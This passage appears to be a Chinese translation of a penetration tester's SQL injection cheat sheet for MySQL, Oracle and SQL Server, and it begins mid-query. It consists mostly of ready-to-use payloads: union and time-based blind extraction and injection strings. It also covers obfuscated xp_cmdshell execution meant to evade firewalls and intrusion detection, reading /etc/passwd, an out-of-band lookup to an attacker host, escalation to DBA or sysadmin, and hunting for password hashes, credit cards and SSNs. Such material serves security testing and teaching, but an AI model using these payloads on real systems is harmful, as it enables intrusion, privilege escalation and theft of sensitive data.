LEN(@listStr)-1);SELECT CAST(@myoutput as int); 显示列列表 注意：下面的查询必须在一行中执行。 DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..syscolumns WHERE id=object_id(&#39;MYTABLE&#39;);SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int); 显示列数据注意：下面的查询必须在一行中执行。 用*替换MYCOLUMN来选择所有列 DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + MYCOLUMN + &#39;,&#39; FROM MYDATABASE..MYTABLE;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)SELECT CAST(@myoutput as int); 一次显示一个数据库名称注意：递增内部TOP值以获取下一条记录 SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC 联合查询 基于联合的SQL注入允许攻击者通过扩展原始查询返回的结果来从数据库中提取信息。 仅当原始/新查询具有相同结构（列的数量和数据类型）时，才能使用联合运算符。 MySQL 描述 语句 联合 SELECT “mysql” UNION SELECT @@version 联合子查询 SELECT “mysql” UNION (select @@version) 联合null 注意：如果原始查询返回多个列，则添加null以等于列数 SELECT “mysql”,”test” UNION SELECT @@version,null 堆叠查询 注意：堆叠查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。 SELECT “mysql”; INSERT INTO ‘docs’ (‘content’) VALUES ((SELECT @@version)) Oracle 描述 语句 联合 SELECT user FROM dual UNION SELECT * FROM v$version 联合子查询 SELECT user FROM dual UNION (SELECT * FROM v$version) 联合null 注意：如果原始查询返回多个列，则添加null以等于列数 SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version) SQL Server 描述 语句 联合 SELECT user UNION SELECT @@version 联合子查询 SELECT user UNION (SELECT @@version) 联合null 注意：如果原始查询返回多个列，则添加null以等于列数 SELECT user,system_user UNION (SELECT @@version,null) 联合null二进制减半 注意：此查询用于检测列数。[numberOfColumns]大于列数则返回错误，从而找到表中列的数目。 SELECT * FROM yourtable ORDER BY [numberOfColumns] 堆积式查询 注意：堆积式查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。 SELECT @@version; SELECT @@version – 盲注 盲注是更高级的注入方法之一。部分盲和全盲方法详述如下。执行这些查询时要小心，因为如果通过大量自动化执行，它们可能会使服务器过载。 MySQL部分盲 部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。 描述 语句 版本是5.xx SELECT substring(version(),1,1)=5 子选择启用 SELECT 1 AND (select 1)=1 表log_table存在 SELECT 1 AND (select 1 from log_table limit 0,1)=1 列message存在于表log_table中 注意：如果列不存在，则查询应该出错 SELECT message FROM log_table LIMIT 0,1 第一条message的第一个字母是t SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114 将部分盲查询转换为全盲查询 通过使用以下转换，可以在全盲方案中使用上述任何查询： 1SELECT IF(*PARTIAL_BLIND_QUERY*, SLEEP(5), null) 全盲 部分盲注可以通过HTTP响应中的不同HTTP状态代码，响应时间，内容长度和HTML内容来确定。这些标记可以指示真或假的陈述。下面的查询将试图通过在猜测的信息上声明真或假的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。 描述 语句 用户是root SELECT IF(user() LIKE ‘root@%’, SLEEP(5), null) 用户是root（Benchmark 方法） SELECT IF(user() LIKE ‘root@%’, BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’)), null) 版本是5.xx SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null) Oracle部分盲 部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。 描述 语句 版本是12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE ‘Oracle%12.2%’; 子选择启用 SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) 表log_table存在 SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); 列message存在于表log_table中 Select COUNT(*) from user_tab_cols where column_name = ‘MESSAGE’ and table_name = ‘LOG_TABLE’; 第一条message的第一个字母是t Select message from log_table where rownum=1 and message LIKE ‘t%’; 将部分盲查询转换为全盲查询 通过使用以下转换，可以在全盲方案中使用上述任何查询： 1SELECT CASE WHEN (*PARTIAL_BLIND_QUERY*)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual 部分盲查询必须返回一行，因此总是尝试在所选列上使用COUNT。添加”all_users [letter]”，直到数据库响应变慢。 如果数据库缓存响应，您可能需要循环[letter]。 全盲 全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他out-of-band 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。 描述 语句 版本是12.2 SELECT CASE WHEN (SELECT COUNT(*) FROM v$version WHERE banner LIKE ‘Oracle%11.2%’)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual SQL Server部分盲 部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。 描述 语句 版本是12.0.2000.8 SELECT @@version WHERE @@version LIKE ‘%12.0.2000.8%’ 子选择启用 SELECT (SELECT @@version) 表log_table存在 SELECT * FROM log_table 列message存在于表log_table中 SELECT message from log_table 第一条message的第一个字母是t WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like ‘t%’ 将部分盲查询转换为全盲查询 通过使用以下转换，可以在全盲方案中使用上述任何查询： 1IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02' 全盲 全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他out-of-band 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。 描述 语句 Version is 12.0.2000.8 IF exists(SELECT @@version where @@version like ‘%12.0.2000.8%’) WAITFOR DELAY ‘00&#58;00&#58;02’ 4.注入技术条件语句 条件语句有助于创建复杂的查询并帮助盲注入。 MySQL 描述 语句 If/Else SELECT IF(1=2,’true’,’false’) 逻辑 OR SELECT 1 &#124;&#124; 0 看到这个运算符的细微差别详见 Oracle 描述 语句 Case SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual SQL Server 描述 语句 Case SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END If/Else IF 1=2 SELECT ‘true’ ELSE SELECT ‘false’; ### 注入定位 当注入发生的地方并不明显时，SQL注入总是很麻烦。有一些方法可以在查询的各个部分利用注入是有帮助的。 $injection确定注入点。修改数据的注入尝试始终使用连接，并允许查询的其余部分有效。通过这个文章可以了解更多信息。 MySQL 注入位置 语句 注入字符串 SELECT -&gt; WHERE SELECT * FROM USERS WHERE USER=’$injection’; ‘ or 1=1 – UPDATE -&gt; SET UPDATE USERS SET email=’$injection’ WHERE user=’NetSPI’; ‘ &#39;harold@netspi.com‘ ‘ UPDATE -&gt; WHERE 注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。 UPDATE USERS SET email=&#39;harold@netspi.com‘ WHERE user=’$injection’; ‘ ‘netspi’ ‘ DELETE -&gt; WHERE 注意：运行删除语句时要非常小心，因为整个表都会被删除。 DELETE FROM USERS WHERE USERS=’$injection’; ‘ &#39;harold@netspi.com‘ ‘ Oracle 注入位置 语句 注入字符串 SELECT -&gt; WHERE SELECT user FROM dual WHERE user LIKE ‘$injection’; ‘&#124;&#124;’USER%’&#124;&#124;’ INSERT -&gt; VALUES INSERT INTO log_table (message) VALUES (‘$injection’); ‘&#124;&#124;(select user from dual)&#124;&#124;’ UPDATE -&gt; SET UPDATE log_table SET message = ‘$injection’ WHERE message = ‘test’; ‘&#124;&#124;(select user from dual)&#124;&#124; UPDATE -&gt; WHERE 注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。 UPDATE log_table SET message = ‘test’ WHERE message = ‘$injection’; ‘&#124;&#124;’Injected’&#124;&#124;’ SQL Server 注入位置 语句 注入字符串 SELECT -&gt; WHERE SELECT * FROM USERS WHERE “USER”=’$injection’; ‘ or 1=1 – UPDATE -&gt; SET UPDATE USERS SET “email”=’$injection’ WHERE “USER”=’NetSPI’; &#39;+&#39;harold@netspi.com‘+’ UPDATE -&gt; WHERE 注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。 UPDATE USERS SET “email”=&#39;harold@netspi.com‘ WHERE “USER”=’$injection’; ‘+’NetSPI’+’ DELETE -&gt; WHERE DELETE USERS WHERE “User”=’$injection’; ‘+’NetSPI’+’ INSERT -&gt; VALUES INSERT INTO USERS ([User], [Password]) VALUES (‘$injection’, ‘password’); ‘+(select @@version)+’ ### 混淆查询 混淆查询帮助绕过Web应用程序防火墙（WAF）和入侵检测/预防系统（IDS / IPS）。以下是基本查询混淆的示例，它们在应用于某些注入之前可能需要进行修改。 MySQL 描述 语句 ASCII&gt;字符 SELECT char（65） 字符&gt; ASCII SELECT ascii（’A’） 十六进制 SELECT 0x4A414B45 Hex&gt; Int SELECT 0x20 + 0x40 按位与 SELECT 6 &amp; 2 按位或 SELECT 6 按位否定 SELECT ~6 按位XOR SELECT 6 ^ 2 右移 SELECT 6&gt;&gt;2 左移 SELECT 6&lt;&lt;2 字符串截取 SELECT substr(‘abcd’, 3, 2) substr(string, index, length) Casting SELECT cast(‘1’ AS unsigned integer) SELECT cast(‘123’ AS char) 字符串连接 SELECT concat(‘net’,’spi’) SELECT ‘n’ ‘et’ ‘spi’ 无引号 SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69)) 块注释 SELECT/*block comment*/“test” 单行注释 SELECT 1 – comments out rest of line SELECT 1 # comments out rest of line 无空格 SELECT(username)FROM(USERS)WHERE(username=’netspi’) 允许空白 09, 0A, 0B, 0C, 0D, A0, 20 URL 编码 SELECT%20%2A%20FROM%20USERS 双URL编码 SELECT%2520%2A%2520FROM%2520USERS 无效百分号编码 %SEL%ECT * F%R%OM U%S%ERS 进一步阅读请点击 Oracle 描述 语句 ASCII&gt;字符 SELECT char(65) from dual 字符&gt; ASCII SELECT ascii(‘A’) from dual 按位AND SELECT 6 &amp; 2 from dual 按位或 SELECT 6 from dual 按位否定 SELECT ~6 from dual 按位XOR SELECT 6 ^ 2 from dual 选择第N个字符 SELECT substr(‘abcd’, 3, 1) FROM dual; – Returns 3rd charcter, ‘c’ 字符串截取 SELECT substr(‘abcd’, 3, 2) from dual substr(string, index, length) Cast select CAST(12 AS CHAR(32)) from dual 字符串连接 SELECT concat(‘net’,’spi’) from dual 注释 SELECT 1 FROM dual – comment If 语句 BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; Case 语句 SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; – Returns 1 SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; – Returns 2 时间延迟 BEGIN DBMS_LOCK.SLEEP(5); END; (Requires Privileges) SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; SELECT UTL_HTTP.REQUEST(‘http://google.com&#39;) FROM dual; 选择第n行 SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; – Returns 9th row 按位与 SELECT bitand(6,2) FROM dual; – Returns 2 SELECT bitand(6,1) FROM dual; – Returns 0 字符串连接 SELECT ‘A’ &#124;&#124; ‘B’ FROM dual; – Returns AB 避免引号 SELECT chr(65) &#124;&#124; chr(66) FROM dual; – Returns AB 16进制编码 SELECT 0x75736572 FROM dual; SQL Server 描述 语句 ASCII&gt;字符 SELECT char（65） 字符&gt; ASCII SELECT ascii（’A’） Hex&gt; Int SELECT 0x20 + 0x40 按位AND SELECT 6 &amp; 2 按位或 SELECT 6 按位否定 SELECT ~6 按位XOR SELECT 6 ^ 2 字符串截取 SELECT substring(‘abcd’, 3, 2) substring(string, index, length) Casting SELECT cast(‘1’ AS unsigned integer) SELECT cast(‘123’ AS char) 字符串连接 SELECT concat(‘net’,’spi’) 注释 SELECT 1 –comment SELECT/*comment*/1 避免引号 SELECT char(65)+char(66) – returns AB 使用％0d避免使用分号 %0dwaitfor+delay+&#39;0:0:10&#39;-- Bypass Filtering EXEC xP_cMdsheLL ‘dir’; 用注释避免空格 EXEC/**/xp_cmdshell/**/‘dir’;– ‘;ex/**/ec xp_cmds/**/hell ‘dir’; 用连接避免查询检测 DECLARE @cmd as varchar(3000);SET @cmd = ‘x’+’p’+’_’+’c’+’m’+’d’+’s’+’h’+’e’+’l’+’l’+’/**/‘+””+’d’+’i’+’r’+””;exec(@cmd); 用字符编码避免查询检测 DECLARE @cmd as varchar(3000);SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd); 用base64编码避免查询检测 DECLARE @data varchar(max), @XmlData xml;SET @data = ‘ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn’;SET @XmlData = CAST(‘’ + @data + ‘’ as xml);SET @data = CONVERT(varchar(max), @XmlData.value(‘(data)[1]’, ‘varbinary(max)’));exec (@data); 用Nchar编码避免查询检测 DECLARE @cmd as nvarchar(3000);SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+ nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+nchar(101)+nchar(114)+nchar(46)+nchar(46)+ nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)+nchar(100)+nchar(115)+nchar(104)+ nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)+nchar(105)+nchar(114)+nchar(39)+nchar(59));EXEC(@cmd); 用ASCII + CAST 编码避免查询检测 DECLARE @cmd as varchar(MAX);SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));exec(@cmd); 用ASCII + CONVERT 编码避免查询检测 DECLARE @cmd as varchar(MAX);SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);exec(@cmd); 用varbinary(MAX) 避免查询检测 DECLARE @cmd as varchar(MAX);SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec(@cmd); 用 sp_sqlexec 避免 EXEC() DECLARE @cmd as varchar(3000);SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);exec sp_sqlexec @cmd; 执行 xp_cmdshell ‘dir’ DECLARE @tmp as varchar(MAX);SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+char(68)+char(83)+char(72)+char(69)+char(76)+char(76);exec @tmp ‘dir’; 5.攻击查询信息收集 收集有关任何测试环境的信息通常很有价值; 版本号，用户帐户和数据库都有助于升级漏洞。以下是常见的方法。 *需要特权用户 MySQL 描述 语句 版本 SELECT @@version 单个用户 SELECT user() SELECT system_user() 所有用户 SELECT user FROM mysql.user *SELECT Super_priv FROM mysql.user WHERE user= ‘root’ LIMIT 1,1 表 SELECT table_schema, table_name FROM information_schema.tables 列 SELECT table_name, column_name FROM information_schema.columns 数据库 SELECT schema_name FROM information_schema.schemata 当前数据库名称 SELECT database() 查询其他数据库 USE [database_name]; SELECT database(); SELECT [column] FROM [database_name].[table_name] 列数 SELECT count(*) FROM information_schema.columns WHERE table_name = ‘[table_name]’ DBA账户 SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’ 密码哈希 SELECT host, user, password FROM mysql.user Schema SELECT schema() 数据路径 SELECT @@datadir 读取文件 * SELECT LOAD_FILE(‘/etc/passwd’) Oracle 描述 语句 版本 SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;SELECT version FROM v$instance; 单个用户 SELECT user FROM dual 所有用户 SELECT username FROM all_users ORDER BY username;*SELECT name FROM sys.user$; 表 SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; 通过列名称获取表 SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; 列 SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’; SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’; 当前数据库名称 SELECT global_name FROM global_name;SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE;SELECT SYS.DATABASE_NAME FROM DUAL; 数据库 SELECT DISTINCT owner FROM all_tables; DBA 账户 SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; 特权 SELECT * FROM session_privs;(Retrieves Current Privs) * SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; * SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’;SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; DB文件的位置 SELECT name FROM V$DATAFILE; 主机名，IP地址 SELECT UTL_INADDR.get_host_name FROM dual;SELECT host_name FROM v$instance;SELECT UTL_INADDR.get_host_address FROM dual; (IP地址)SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; (主机名) SQL Server 描述 语句 版本 SELECT @@version; 单个用户 SELECT user;SELECT system_user;SELECT user_name();SELECT loginame from master..sysprocesses where spid = @@SPID 所有用户 SELECT name from master..syslogins 表 SELECT table_catalog, table_name FROM information_schema.columns 列 SELECT table_catalog, column_name FROM information_schema.columns 所有数据库 SELECT name from master..sysdatabases; 当前数据库 SELECT db_name(); 服务器名称 SELECT @@SERVERNAME 查找存储过程 SELECT * from master..sysobjects where name like ‘sp%’ order by name desc 通过用户名获取SUID SELECT SUSER_ID(‘sa’) 通过SUID获取用户名 SELECT SUSER_NAME(1) 检查账户是不是管理员 IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E)) SELECT is_srvrolemember(‘sysadmin’); Policies SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id 域用户 https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql DB 审计 SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id Server 审计 SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id 查询历史记录 SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),&#39;Ad-Hoc&#39;) AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC 数据定位 能够正确地识别和定位敏感信息可以以指数的方式减少在数据库中花费的时间，这意味着可以花费更多的时间在其他方向上。 数据定位查询MySQL 描述 语句 数据库大小 SELECT table_schema &quot;Database Name&quot;,sum( data_length + index_length ) / 1024 / 1024 &quot;Database Size in MB&quot;,sum( data_free )/ 1024 / 1024 &quot;Free Space in MB&quot; FROM information_schema.TABLES GROUP BY table_schema ; 数据库名称关键字 SELECT table_schema &quot;Database Name&quot; FROM information_schema.TABLES WHERE table_schema LIKE &quot;%passwords%&quot; GROUP BY table_schema ; 表名关键字 SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE &quot;information_schema&quot; AND table_name LIKE &quot;%admin%&quot;; 列名关键字 SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE &quot;%password%&quot;; 列数据正则表达式 SELECT * from credit_cards WHERE cc_number REGEXP &#39;^4[0-9]{15}$&#39;; Oracle 描述 语句 寻找敏感数据 SELECT owner,table_name,column_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; 寻找特权 SELECT * FROM session_privs SELECT * FROM USER_SYS_PRIVS SELECT * FROM USER_TAB_PRIVSSELECT * FROM USER_TAB_PRIVS_MADESELECT * FROM USER_TAB_PRIVS_RECDSELECT * FROM ALL_TAB_PRIVSSELECT * FROM USER_ROLE_PRIVS 提取存储过程/ Java源 SELECT * FROM all_source WHERE owner NOT IN (‘SYS’,’SYSTEM’) SELECT * FROM all_source WHERE TYPE LIKE ‘%JAVA %’ SELECT TO_CHAR(DBMS_METADATA.get_ddl(‘TABLE’,’DEPT’,’CONSUELA’)) FROM dual SQL Server 描述 语句 列出非默认数据库 SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE ‘distribution’) AND (NAME NOT LIKE ‘master’) AND (NAME NOT LIKE ‘model’) AND (NAME NOT LIKE ‘msdb’) AND (NAME NOT LIKE ‘publication’) AND (NAME NOT LIKE ‘reportserver’) AND (NAME NOT LIKE ‘reportservertempdb’) AND (NAME NOT LIKE ‘resource’) AND (NAME NOT LIKE ‘tempdb’) ORDER BY NAME; 列出非默认表 SELECT ‘[‘ + SCHEMA_NAME(t.schema_id) + ‘].[‘ + t.name + ‘]’ AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid &lt; 2 WHERE (ROWS&gt; 0) AND (t.name NOT LIKE ‘syscolumns’) AND (t.name NOT LIKE ‘syscomments’) AND (t.name NOT LIKE ‘sysconstraints’) AND (t.name NOT LIKE ‘sysdepends’) AND (t.name NOT LIKE ‘sysfilegroups’) AND (t.name NOT LIKE ‘sysfiles’) AND (t.name NOT LIKE ‘sysforeignkeys’) AND (t.name NOT LIKE ‘sysfulltextcatalogs’) AND (t.name NOT LIKE ‘sysindexes’) AND (t.name NOT LIKE ‘sysindexkeys’) AND (t.name NOT LIKE ‘sysmembers’) AND (t.name NOT LIKE ‘sysobjects’) AND (t.name NOT LIKE ‘syspermissions’) AND (t.name NOT LIKE ‘sysprotects’) AND (t.name NOT LIKE ‘sysreferences’) AND (t.name NOT LIKE ‘systypes’) AND (t.name NOT LIKE ‘sysusers’) ORDER BY TABLE_NAME; 列名搜索 SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like ‘%password%’ 列出非默认列 SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH &gt; 14 AND DATA_TYPE NOT IN (‘bigint’,’binary’,’bit’,’cursor’,’date’,’datetime’,’datetime2’, ‘datetimeoffset’,’float’,’geography’,’hierarchyid’,’image’,’int’,’money’,’real’, ‘smalldatetime’,’smallint’,’smallmoney’,’sql_variant’,’table’,’time’,’timestamp’, ‘tinyint’,’uniqueidentifier’,’varbinary’,’xml’) AND TABLE_NAME=’CreditCard’ OR CHARACTER_MAXIMUM_LENGTH &lt; 1 AND DATA_TYPE NOT IN ( ‘bigint’, ‘binary’, ‘bit’, ‘cursor’, ‘date’, ‘datetime’, ‘datetime2’, ‘datetimeoffset’, ‘float’, ‘geography’, ‘hierarchyid’, ‘image’, ‘int’, ‘money’, ‘real’, ‘smalldatetime’, ‘smallint’, ‘smallmoney’, ‘sql_variant’, ‘table’, ‘time’, ‘timestamp’, ‘tinyint’, ‘uniqueidentifier’, ‘varbinary’, ‘xml’) AND TABLE_NAME=’CreditCard’ ORDER BY COLUMN_NAME; 搜索透明加密 SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1 按数据库大小搜索 SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC 数据定位正则表达式 描述 语句 所有主要的信用卡提供商 ^(?:4[0-9]{12}(?:[0-9]{3})?&#124;(?:5[1-5][0-9]{2}&#124;222[1-9]&#124;22[3-9][0-9]&#124;2[3-6][0-9]{2}&#124;27[01][0-9]&#124;2720)[0-9]{12}&#124;3[47][0-9]{13}&#124;3(?:0[0-5]&#124;[68][0-9])[0-9]{11}&#124;6(?:011&#124;5[0-9]{2})[0-9]{12}&#124;(?:2131&#124;1800&#124;35\d{3})\d{11})$ Unmasked &#124; Masked SSN ^(\d{3}-?\d{2}-?\d{4}&#124;XXX-XX-XXXX)$ 数据定位关键字 关键字 credit card pin cvv pan password social ssn account confidential 提权 某些功能需要特权用户，并且为了升级漏洞，特权用户始终是第一步。 MySQL 暂无 Oracle *需要特权用户 描述 语句 转储所有DBA用户名 SELECT username FROM user_role_privs WHERE granted_role=’DBA’; 建立DBA用户 * GRANT DBA to USER 创建过程 CREATE OR REPLACE PROCEDURE &quot;SYSTEM&quot;.netspi1 (id IN VARCHAR2) AS PRAGMA autonomous_transaction; EXECUTE IMMEDIATE &#39;grant dba to scott&#39;; COMMIT; END; BEGIN SYSTEM.netspi1(&#39;netspi&#39;); END; 查找数据库链接 SELECT * FROM DBA_DB_LINKSSELECT * FROM ALL_DB_LINKSSELECT * FROM USER_DB_LINKS 查询数据库链接 SELECT * FROM sales@miami – minimum for preconfiguredSELECT * FROM harold@netspi.com – standard usage for selecting table from schema on remote serverSELECT * FROM harold@netspi.com@hq_1 – standard usage for selecting table from schema on remote server instanceSELECT db_link,password FROM user_db_links WHERE db_link LIKE ‘TEST%’’SELECT name,password FROM sys.link$ WHERE name LIKE ‘TEST%’;SELECT name,passwordx FROM sys.link$ WHERE name LIKE ‘TEST%’; 在数据库链接上执行存储过程 EXEC mySchema.myPackage.myProcedure@myRemoteDB( ‘someParameter’ );SELECT dbms_xmlquery.getxml(‘select * from emp’) FROM harold@netspi.com 创建数据库链接 CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; – connected user setupCREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; – standard defined user/passCREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq_1 USING ‘string_to_hq_1’; – instance specificCREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING ‘us_supply’; – defined userpass 删除链接 DROP DATABASE LINK miami; SQL Server *需要特权用户。以下查询需要各种权限类型。请继续关注详细的权限提升路径。 描述 语句 建立DBA用户 * EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’; 授予所有自定义对象的执行权限 SELECT ‘grant exec on ‘ + QUOTENAME(ROUTINE_SCHEMA) + ‘.’ +QUOTENAME(ROUTINE_NAME) + ‘ TO test’ FROM INFORMATION_SCHEMA.ROUTINESWHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),’IsMSShipped’) = 0 ; 授予执行所有存储过程 CREATE ROLE db_executorGRANT EXECUTE TO db_executorexec sp_addrolemember ‘db_executor’, ‘YourSecurityAccount’ UNC路径注入 https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6ehttps://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/ 检测非模拟登录 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ‘IMPERSONATE’ 模拟登录 注意：REVERT会将您带回原始登录名。 